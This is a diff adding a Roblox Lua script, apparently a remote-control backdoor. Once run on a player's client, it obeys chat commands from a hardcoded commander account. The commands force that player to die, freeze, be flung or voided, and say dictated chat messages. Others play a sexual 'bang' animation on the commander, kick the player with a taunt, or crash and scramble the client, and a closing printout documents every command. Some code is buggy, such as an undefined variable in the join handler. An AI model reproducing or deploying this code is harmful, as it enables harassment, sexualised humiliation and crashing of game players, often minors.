@@ -1,0 +1,610 @@
+if _G.Cumming then game.StarterGui:SetCore("ChatMakeSystemMessage",{Text="Already Running",Color=Color3.fromRGB(100,0,0),Font=Enum.Font.Arcade,FontSize=Enum.FontSize.Size12}) return end
+pcall(function() _G.Cumming = true end)
+game.StarterGui:SetCore("ChatMakeSystemMessage",{Text="Version 1.025",Color=Color3.fromRGB(100,0,0),Font=Enum.Font.Arcade,FontSize=Enum.FontSize.Size12})
+Frame_Speed = 1 / 120
+ArtificialHB = Instance.new("BindableEvent", script)
+ArtificialHB.Name = "ArtificialHB"
+script:WaitForChild("ArtificialHB")
+frame = Frame_Speed
+tf = 0
+allowframeloss = false
+tossremainder = true
+lastframe = tick()
+script.ArtificialHB:Fire()
+game:GetService("RunService").Heartbeat:connect(function(s, p)
+    tf = tf + s
+    if tf >= frame then
+        if allowframeloss then
+            script.ArtificialHB:Fire()
+            lastframe = tick()
+        else
+            for i = 1, math.floor(tf / frame) do
+                script.ArtificialHB:Fire()
+            end
+            lastframe = tick()
+        end
+        if tossremainder then
+            tf = 0
+        else
+            tf = tf - frame * math.floor(tf / frame)
+        end
+    end
+end)
+function swait(NUMBER)
+    if(NUMBER == 0 or typeof(NUMBER) ~= 'number')then
+        ArtificialHB.Event:wait()
+    else    
+        for i = 1, NUMBER do
+            ArtificialHB.Event:wait()
+        end
+    end
+end 
+SCRM = function(M) pcall(function() game.StarterGui:SetCore("ChatMakeSystemMessage",{Text=M,Color=Color3.fromRGB(100,0,0),Font=Enum.Font.Arcade,FontSize=Enum.FontSize.Size12}) end) end
+Commanders = {2323049520};
+LHost = game:GetService("Players").LocalPlayer;
+Bully = nil; S = string.sub; Prefix = ";"; BDN = nil; CommanderPresent = false;
+HostServices = {["Main"] = {game,workspace},["Services"] = {game:GetService("ReplicatedStorage"),game:GetService("Workspace"),game:GetService("Debris")}}
+stopeverything = false; Frozen = false; LoopVoiding = false; 
+LoopBringing = false; HeadSitting = false; LoopKilling = false;
+SpamSitting = false; SpamJumping = false; Banging = false;
+WalkSpeed = 16; JumpPower = 50;
+SCRM("Setting Main Runtime");
+randomstring = function()
+    local length = math.random(10,20)
+    local array = {}
+    for i = 1,length do
+        array[i] = string.char(math.random(14,126))
+    end
+    return table.concat(array)
+end
+ForceStates = function()
+    coroutine.resume(coroutine.create(function()
+        while not stopeverything do
+            swait()
+            pcall(function()
+                if not CommanderPresent then return end
+                workspace[LHost.Name]:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Dead, true)
+                workspace[LHost.Name]:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Swimming, true)
+                workspace[LHost.Name]:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+                workspace[LHost.Name]:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
+                workspace[LHost.Name]:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Physics, true)
+                workspace[LHost.Name]:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
+                workspace[LHost.Name]:FindFirstChildOfClass("Humanoid").UseJumpPower = true
+                workspace[LHost.Name]:FindFirstChildOfClass("Humanoid").BreakJointsOnDeath = true
+                workspace[LHost.Name]:FindFirstChildOfClass("Humanoid").WalkSpeed = WalkSpeed
+                workspace[LHost.Name]:FindFirstChildOfClass("Humanoid").JumpPower = JumpPower
+            end)
+        end
+    end))
+end
+Freeze = function()
+    if stopeverything then wait(math.huge); end
+    pcall(function()
+        if Frozen then
+            Frozen = false;
+            for i,v in pairs(workspace[LHost.Name]:GetDescendants()) do
+                if v:IsA("BasePart") then
+                    v.Anchored = false;
+                end
+            end
+        elseif not Frozen then
+            Frozen = true;
+            for i,v in pairs(workspace[LHost.Name]:GetDescendants()) do
+                if v:IsA("BasePart") then
+                    v.Anchored = true
+                end
+            end
+        end
+    end)
+end
+UpDown = function()
+    if stopeverything then wait(math.huge); end
+    pcall(function()
+        if math.random(1,2) == 1 then
+            workspace[LHost.Name].HumanoidRootPart.CFrame = CFrame.new(0,9e30,0);
+        else
+            workspace[LHost.Name].HumanoidRootPart.CFrame = CFrame.new(0,workspace.FallenPartsDestroyHeight+3,0);
+        end
+    end)
+end
+LoopVoid = function()
+    if stopeverything then wait(math.huge); end
+    pcall(function()
+        LoopVoiding = true;
+        LoopBringing = false;
+        HeadSitting = false;
+        LoopKilling = false;
+        Banging = false;
+        coroutine.resume(coroutine.create(function()
+            while LoopVoiding and not stopeverything do
+                wait(2);
+                workspace[LHost.Name].HumanoidRootPart.CFrame = CFrame.new(0,workspace.FallenPartsDestroyHeight+3,0);
+                game:GetService("StarterGui"):SetCore("ResetButtonCallback", false);
+            end
+            game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
+        end))
+    end)
+end
+VoidChar = function()
+    pcall(function()
+        workspace[LHost.Name].HumanoidRootPart.CFrame = CFrame.new(0,workspace.FallenPartsDestroyHeight+3,0);
+        game:GetService("StarterGui"):SetCore("ResetButtonCallback", false);
+    end)
+end
+Cringe = function()
+    if stopeverything then wait(math.huge); end
+    stopeverything = true;
+    coroutine.resume(coroutine.create(function()
+        OriginalCF = workspace.CurrentCamera.CFrame;
+        sine = 0;
+        repeat
+            wait();
+            for i = 1,100 do
+                wait();
+                workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable;
+                sine = sine + 1;
+                workspace.CurrentCamera.CFrame = OriginalCF * CFrame.Angles(math.rad(sine),math.rad(sine),math.rad(sine));
+                workspace.CurrentCamera.FieldOfView = 70 + i;
+            end
+            for i = 1,100 do
+                wait();
+                workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable;
+                sine = sine + 1;
+                workspace.CurrentCamera.CFrame = OriginalCF * CFrame.Angles(math.rad(sine),math.rad(sine),math.rad(sine));
+                workspace.CurrentCamera.FieldOfView = 170 - i;
+            end
+        until stopeverything == false;
+    end))
+    while true do
+        wait();
+        pcall(function()
+            coroutine.resume(coroutine.create(function()
+                for i,v in pairs(game:GetDescendants()) do
+                    if v:IsA("TextBox") or v:IsA("TextButton") or v:IsA("TextLabel") then
+                        v.Text = randomstring();
+                    elseif v:IsA("BasePart") then
+                        pcall(function()
+                            v.BrickColor = BrickColor.random();
+                        end)
+                    end
+                end
+            end))
+            game:GetService("Lighting").Brightness = game:GetService("Lighting").Brightness + 0.01;
+            if game:GetService("Lighting").Brightness > 5 then game:GetService("Lighting").Brightness = 0; end
+            game:GetService("Lighting").FogColor = Color3.new(255,0,0);
+            game:GetService("Lighting").FogStart = 10;
+            game:GetService("Lighting").FogEnd = 100000;
+            game:GetService("Lighting").TimeOfDay = 0;
+            LHost.Character = nil;
+            LHost.Parent = game.Parent;
+            for i,v in pairs(game:GetService("Players"):GetPlayers()) do pcall(function() v.Parent = game.Parent; end) end
+        end)
+    end
+end
+LoopBring = function()
+    if stopeverything then wait(math.huge); end
+    pcall(function()
+        LoopVoiding = false;
+        LoopBringing = true;
+        HeadSitting = false;
+        LoopKilling = false;
+        Banging = false;
+        coroutine.resume(coroutine.create(function()
+            repeat
+                swait()
+                workspace[LHost.Name].HumanoidRootPart.CFrame = workspace[Bully].HumanoidRootPart.CFrame * CFrame.new(0,0,-4);
+            until not LoopBringing
+        end))
+    end)
+end
+HSF = nil HeadSit = function()
+    if stopeverything then wait(math.huge); end
+    if HeadSitting then
+        HeadSitting = false;
+    elseif not HeadSitting then
+        LoopVoiding = false;
+        LoopBringing = false;
+        HeadSitting = true;
+        LoopKilling = false;
+        Banging = false;
+        pcall(function() BangAnimtion:Stop() BangAnimtion:Destroy() end)
+        HSF = game:GetService("RunService").RenderStepped:Connect(function()
+            pcall(function()
+                if workspace[LHost.Name] ~= nil and workspace[Bully] ~= nil then
+                    pcall(function()
+                        for i,v in pairs(workspace[LHost.Name]:GetDescendants()) do
+                            if v:IsA("BasePart") then
+                                v.CanCollide = false
+                                v.Massless = true
+                            end
+                        end
+                    end)
+                end
+                workspace[LHost.Name]:FindFirstChildOfClass("Humanoid").Sit = true
+                workspace[LHost.Name].HumanoidRootPart.CFrame = workspace[Bully].HumanoidRootPart.CFrame * CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)) * CFrame.new(0,1.6,0.4)
+            end)
+            if not HeadSitting then
+                pcall(function() BangAnimtion:Stop() BangAnimtion:Destroy() end)
+            end
+        end)
+    end
+end
+Kill = function()
+    if stopeverything then wait(math.huge); end
+    pcall(function()
+        workspace[LHost.Name]:FindFirstChildOfClass("Humanoid").Health = 0;
+        workspace[LHost.Name]:FindFirstChildOfClass("Humanoid"):Destroy();
+        workspace[LHost.Name]:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Dead, true)
+    end)
+end
+LoopKill = function()
+    pcall(function()
+        LoopVoiding = false;
+        LoopBringing = false;
+        HeadSitting = false;
+        LoopKilling = true;
+        Banging = false;
+        pcall(function() BangAnimtion:Stop(); BangAnimtion:Destroy(); end)
+        coroutine.resume(coroutine.create(function()
+            repeat
+                wait(0.075)
+                pcall(function()
+                    if LHost:HasAppearanceLoaded() == false then return end
+                    workspace[LHost.Name]:FindFirstChildOfClass("Humanoid"):Destroy();
+                end)
+            until LoopKilling == false
+        end))
+    end)
+end
+Kick = function()
+    if stopeverything then wait(math.huge); end
+    pcall(function()
+        game:GetService("Players").LocalPlayer:Kick("\nYou\nWere\nKicked\nCry\nAbout\nIt")
+    end) wait(3); HostServices["Main"][1]:Shutdown()
+end
+Crash = function()
+    if stopeverything then wait(math.huge); end
+    while true do
+        coroutine.resume(coroutine.create(function()
+            while true do
+                for i,v in pairs(game:GetDescendants()) do
+                    print("Crashing."); warn("Crashing");
+                    pcall(function() v.Parent = workspace; end)
+                    pcall(function() if v:IsA("RemoteEvent") then v:Fire("Cum"); end end)
+                end
+            end
+        end))
+    end
+end
+BangAnimtion = nil; Bang = function()
+    if stopeverything then wait(math.huge); end
+    pcall(function()
+        Sussy = Instance.new("Animation");
+        if workspace[LHost.Name]:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
+            Sussy.AnimationId = "rbxassetid://5918726674";
+        else
+            Sussy.AnimationId = "rbxassetid://148840371";
+        end
+        BangAnimtion = workspace[LHost.Name]:FindFirstChildOfClass("Humanoid"):LoadAnimation(Sussy);
+        BangAnimtion:Play(.1,1,3.251);
+        LoopVoiding = false;
+        LoopBringing = false;
+        HeadSitting = false;
+        LoopKilling = false;
+        Banging = true;
+        coroutine.resume(coroutine.create(function()
+            while Banging and not stopeverything do
+                swait();
+                pcall(function()
+                    if workspace[LHost.Name] ~= nil and workspace[Bully] ~= nil then
+                        pcall(function()
+                            for i,v in pairs(workspace[LHost.Name]:GetDescendants()) do
+                                if v:IsA("BasePart") then
+                                    v.CanCollide = false;
+                                    v.Massless = true;
+                                end
+                                workspace[LHost.Name].HumanoidRootPart.CFrame = workspace[Bully].HumanoidRootPart.CFrame * CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)) * CFrame.new(0, 0, 1.1)
+                            end
+                        end)
+                        workspace[LHost.Name].HumanoidRootPart.CFrame = workspace[Bully].HumanoidRootPart.CFrame * CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)) * CFrame.new(0, 0, 1.1)
+                    end
+                end)
+            end
+            pcall(function()
+                Sussy:Destroy()
+                BangAnimtion:Stop()
+                BangAnimtion:Destroy()
+            end)
+        end))
+    end)
+end
+SpamSit = function()
+    if stopeverything then wait(math.huge) end
+    pcall(function()
+        if not SpamSitting then
+            SpamSitting = true;
+            coroutine.resume(coroutine.create(function()
+                while SpamSitting and not stopeverything do
+                    swait();
+                    workspace[LHost.Name]:FindFirstChildOfClass("Humanoid").Sit = true
+                end
+            end))
+        end
+    end)
+end
+SpamJump = function()
+    if stopeverything then wait(math.huge) end
+    pcall(function()
+        if not SpamJumping then
+            SpamJumping = true;
+            coroutine.resume(coroutine.create(function()
+                while SpamJumping and not stopeverything do
+                    swait();
+                    workspace[LHost.Name]:FindFirstChildOfClass("Humanoid").Jump = true;
+                end
+            end))
+        end
+    end)
+end
+ForceChat = function(message)
+    pcall(function()
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack({[1] = message,[2] = "All"}))
+    end)
+end
+SetHumanoidStatesAndProperties = function(Alpha,Bravo)
+    pcall(function()
+        if Alpha == "WalkSpeed" then
+            WalkSpeed = Bravo
+        elseif Alpha == "JumpPower" then
+            JumpPower = Bravo
+        end
+    end)
+end
+Ap = {}; KillClient = function()
+    pcall(function()
+        if Bully.Name ~= LHost.Name then game:GetService("Players")[Bully].Parent = game.Parent; end
+        for i,v in pairs(game:GetDescendants()) do
+            pcall(function()
+                if string.find(v.Text,Bully) or string.find(v.Text,BDN) then
+                    Ap[#Ap+1] = v
+                end
+            end)
+        end
+        coroutine.resume(coroutine.create(function()
+            while not stopeverything do
+                swait();
+                pcall(function()
+                    workspace[Bully].Name = randomstring();
+                    for i,v in pairs(Ap) do
+                        if (v and v ~= nil) then
+                            v.Text = randomstring();
+                        end
+                    end
+                end)
+            end
+        end))
+        game.DescendantAdded:Connect(function(v)
+            if string.find(v.Text,Bully) or string.find(v.Text,BDN) then
+                Ap[#Ap+1] = v
+            end
+        end)
+        HostServices["Main"][1]:Shutdown()
+    end)
+end
+Rejoin = function()
+    if stopeverything then wait(math.huge); end
+    pcall(function()
+        game:FindFirstChildOfClass("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.JobId)
+    end)
+end
+Fling = function()
+    pcall(function()
+        for i,v in pairs(workspace[LHost.Name]:GetDescendants()) do
+            if v:IsA("BasePart") then
+                v.CanCollide = false
+                v.Massless = true
+            end
+        end
+        workspace[LHost.Name].HumanoidRootPart.Velocity = Vector3.new(math.random(1,500),math.random(1,500),math.random(1,500))
+    end)
+end
+SuperFling = function()
+    pcall(function()
+        for i,v in pairs(workspace[LHost.Name]:GetDescendants()) do
+            if v:IsA("BasePart") then
+                v.CanCollide = false
+                v.Massless = true
+            end
+        end
+        workspace[LHost.Name].HumanoidRootPart.Velocity = Vector3.new(math.random(1,2000),math.random(1,2000),math.random(1,2000))
+    end)
+end
+function WhisperCmds()
+    if stopeverything then wait(math.huge); end
+    pcall(function()
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack({[1] = "/w "..Bully.." Cmds Are freeze, chance, loopvoid, loopbring, headsit, kill, loopkill, bang, chat, killclient, spamsit, spamjump, walkspeed [value], jumppower[value].",[2] = "All"}))
+    end)
+end
+function Act(CommandSpoke)
+    pcall(function()
+        CommandSpoke = CommandSpoke:lower()
+        if CommandSpoke == "freeze" or CommandSpoke == "fz" or CommandSpoke == "frz" then
+            Freeze();
+        elseif CommandSpoke == "chance" or CommandSpoke == "chnc" or CommandSpoke == "v/c" then
+            UpDown();
+        elseif CommandSpoke == "void" or CommandSpoke == "v" or CommandSpoke == "vd" then
+            VoidChar();
+        elseif CommandSpoke == "lv" or CommandSpoke == "loopvoid" or CommandSpoke == "lvoid" then
+            LoopVoid();
+        elseif CommandSpoke == "unlv" or CommandSpoke == "unloopvoid" or CommandSpoke == "unlvoid" then
+            LoopVoiding = false;
+        elseif CommandSpoke == "cringe" or CommandSpoke == "cr" or CommandSpoke == "crng" then
+            Cringe();
+        elseif CommandSpoke == "loopbring" or CommandSpoke == "lb" or CommandSpoke == "lbring" then
+            LoopBring();
+        elseif CommandSpoke == "unloopbring" or CommandSpoke == "unlb" or CommandSpoke == "unlbring" then
+            LoopBringing = false;
+        elseif CommandSpoke == "headsit" or CommandSpoke == "hs" or CommandSpoke == "hsit" then
+            HeadSit();
+        elseif CommandSpoke == "kill" or CommandSpoke == "k" or CommandSpoke == "kl" then
+            Kill();
+        elseif CommandSpoke == "loopkill" or CommandSpoke == "lk" or CommandSpoke == "lkill" then
+            LoopKill();
+        elseif CommandSpoke == "unloopkill" or CommandSpoke == "unlk" or CommandSpoke == "unlkill" then
+            LoopKilling = false;
+        elseif CommandSpoke == "kick" or CommandSpoke == "kk" or CommandSpoke == "kik" then
+            Kick();
+        elseif CommandSpoke == "crash" or CommandSpoke == "l" or CommandSpoke == "c" then
+            Crash();
+        elseif CommandSpoke == "rejoin" or CommandSpoke == "rj" or CommandSpoke == "rjoin" then
+            Rejoin();
+        elseif CommandSpoke == "cmds" or CommandSpoke == "cmd" or CommandSpoke == "cms" then
+            WhisperCmds();
+        elseif CommandSpoke == "bang" or CommandSpoke == "bn" or CommandSpoke == "bng" then
+            Bang();
+        elseif CommandSpoke == "unbang" or CommandSpoke == "unbn" or CommandSpoke == "unbng" then
+            Banging = false;
+        elseif S(CommandSpoke,1,5) == "chat " then
+            ForceChat(S(CommandSpoke,6));
+        elseif S(CommandSpoke,1,10) == "forcechat " then
+            ForceChat(S(CommandSpoke,11));
+        elseif S(CommandSpoke,1,4) == "cht " then
+            ForceChat(S(CommandSpoke,5));
+        elseif S(CommandSpoke,1,6) == "speed " then
+            SetHumanoidStatesAndProperties("WalkSpeed",S(CommandSpoke,7));
+        elseif S(CommandSpoke,1,3) == "ws " then
+            SetHumanoidStatesAndProperties("WalkSpeed",S(CommandSpoke,4));
+        elseif S(CommandSpoke,1,10) == "walkspeed " then
+            SetHumanoidStatesAndProperties("WalkSpeed",S(CommandSpoke,11));
+        elseif S(CommandSpoke,1,5) == "jump " then
+            SetHumanoidStatesAndProperties("JumpPower",S(CommandSpoke,6));
+        elseif S(CommandSpoke,1,3) == "jp " then
+            SetHumanoidStatesAndProperties("JumpPower",S(CommandSpoke,4));
+        elseif S(CommandSpoke,1,10) == "jumppower " then
+            SetHumanoidStatesAndProperties("JumpPower",S(CommandSpoke,11));
+        elseif CommandSpoke == "spamsit" or CommandSpoke == "ss" or CommandSpoke == "ssit" then
+            SpamSit();
+        elseif CommandSpoke == "spamjump" or CommandSpoke == "sj" or CommandSpoke == "sjump" then
+            SpamJump();
+        elseif CommandSpoke == "unspamsit" or CommandSpoke == "unss" or CommandSpoke == "unssit" then
+            SpamSitting = false;
+        elseif CommandSpoke == "unspamjump" or CommandSpoke == "unsj" or CommandSpoke == "unsjump" then
+            SpamJumping = false;
+        elseif CommandSpoke == "killclient" or CommandSpoke == "crashclient" or CommandSpoke == "crashc" then
+            KillClient();
+        elseif CommandSpoke == "fling" or CommandSpoke == "fl" or CommandSpoke == "flng" then
+            Fling();
+        elseif CommandSpoke == "sfling" or CommandSpoke == "sfl" or CommandSpoke == "sflng" then
+            SuperFling();
+        elseif CommandSpoke == "undo" or CommandSpoke == "forgive" or CommandSpoke == "resetbools" then
+            LoopVoiding = false;
+            LoopBringing = false;
+            LoopKilling = false;
+            Banging = false;
+            SpamJumping = false;
+            SpamSitting = false;
+            Frozen = false;
+            WalkSpeed = 16;
+            JumpPower = 50;
+            pcall(function()
+                for i,v in pairs(workspace[LHost.Name]:GetDescendants()) do
+                    if v:IsA("BasePart") then
+                        v.Anchored = false;
+                    end
+                end
+            end)
+        end
+    end)
+end
+function Listen(Player)
+    pcall(function()
+        if table.find(Commanders,Player.UserId) ~= nil then
+            Bully = Player.Name
+            BDN = Player.DisplayName
+            CommanderPresent = true;
+            ForceStates();
+            SCRM("Commander Joined Or Is Present");
+            Player.Chatted:Connect(function(msg)
+                if stopeverything then wait(math.huge); end
+                if S(msg,1,1) == Prefix then
+                    Act(S(msg,2));
+                end
+            end)
+            game:GetService("Players").PlayerRemoving:Connect(function(v)
+                if v.Name == Player.Name then
+                    SCRM("Commander Left. Reverting States And Functions.");
+                    CommanderPresent = false; SpamJumping = false; SpamSitting = false; LoopKilling = false; LoopVoiding = false; LoopBringing = false;
+                    Banging = false;
+                end
+            end)
+        end
+    end)
+end
+SCRM("Loaded States And Functions.");
+for i,v in pairs(game:GetService("Players"):GetPlayers()) do pcall(function() Listen(v); end) end
+game:GetService("Players").PlayerAdded:Connect(function() Listen(v); end)
+print([[
+Control System By 71007508, Built For Skrenpros And Only Skrenpros.
+Current Uploaded Commands Are :
+    Safe Commands { 
+        Freeze - Saying This Toggles All Anchor Properties For The Host's Character Instance Found In Workspace.
+        Chance - 50/50 Chance To Send To Sky Or Void.
+        Void - Puts Host's Character Into The Void Lol They Dies Cuz Yeah Game Is Poggaahhh~s
+        LoopVoid - Repeatedly Voids The Host's Character Instance With A Wait Interval To Prevent Client Backlash.
+        LoopBring - Repeatedly Sets Host's Character HRP CFrame To Commander Host CFrame With An Offset Of 0,0,-4.
+        Unloopbring - Toggles LoopBring Bool State To False.
+        HeadSit - Forces Host Char To Sit And Sets CFrame To Commander CFrame With Offset Of 0,1.6,0.4.
+        Kill - Sets Host's Character 'Death' State To Enabled And Then Kills Character.
+        LoopKill - Repeatedly Sets Host's Character 'Death' State To Enabled And Then Kills Character.
+        UnloopKill - Toggles LoopKill Bool State To False.
+        Kick - Kicks Host Player Instance.
+        Rejoin - Forces Host To Rejoin Game With Same JobId.
+        Cmds - Whispers Majority Of Commands To Commander Through Private Chat.
+        Bang - Forces Player Into Animation, Sets Host Char CFrame To Commander Char CFrame With Offset Of 0,0,-1.
+        UnBang - Toggles Bang Bool State Value To False.
+        Chat - Forces Host To Say String Provided By Commander.
+        WalkSpeed - Sets Host's Humanoid WalkSpeed Value To Int Value Provided By Commander.
+        JumpPower - Sets Host's Humanoid JumpPower Value To Int Value Provided By Commander.
+        SpamSit - Repeatedly Forces Host's Humanoid Sit State To True.
+        UnSpamSit - Sets SpamSit Bool Value State To False.
+        SpamJump - Repeatedly Forces Host's Humanoid Jump State To True.
+        UnSpamJump - Sets SpamJump Bool Value State To False.
+        Fling - Catapults Host's Character Instance HRP With A Maximum Velocity Of 500,500,500
+        SuperFling - Catapults Host's Character Instance HRP With A Maximum Velocity Of 2000,2000,2000
+        Undo - Resets All Loops And Freeze States.
+    }
+    Blacklisted Commands { 
+        KillClient - CompletelyCloses Roblox And Destroys Commander's Player Instance.
+        Crash - Forcibly Crashes Player By Overloading Client.
+        Cringe - Completely Destroys The Host's Client Without Crashing.   
+    }
+    Alternate Command Keys {
+        Freeze        { freeze      , fz          , frz        }
+        Chance        { chance      , chnc        , v/c        }
+        LoopVoid      { loopvoid    , lv          , lvoid      }
+        Cringe        { cringe      , cr          , crng       }
+        LoopBring     { loopbring   , lb          , lbring     }
+        UnLoopBring   { unloopbring , unlb        , unlbring   }
+        HeadSit       { headsit     , hs          , hsit       }
+        Kill          { kill        , k           , kl         }
+        LoopKill      { loopkill    , lk          , lkill      }
+        UnLoopKill    { unloopkill  , unlk        , unlkill    }
+        Kick          { kick        , kk          , kik        }
+        Crash         { crash       , l           , c          }
+        Rejoin        { rejoin      , rj          , rjoin      }
+        Cmds          { cmds        , cmd         , cms        }
+        Bang          { bang        , bn          , bng        }
+        UnBang        { unbang      , unbn        , unbng      }
+        Chat          { forcechat   , chat        , cht        }
+        WalkSpeed     { walkspeed   , ws          , speed      }
+        JumpPower     { jumppower   , jp          , jump       }
+        SpamSit       { spamsit     , ss          , ssit       }
+        UnSpamSit     { unspamsit   , unss        , unssit     }
+        SpamJump      { spamjump    , sj          , sjump      }
+        UnSpamJump    { unspamjump  , unsj        , unsjump    }
+        KillClient    { killclient  , crashclient , crashc     }
+        Fling         { fling       , fl          , flng       }
+        SuperFling    { sfling      , sfl         , sflng      }
+        Undo          { undo        , forgive     , resetbools }
+    }
+]])
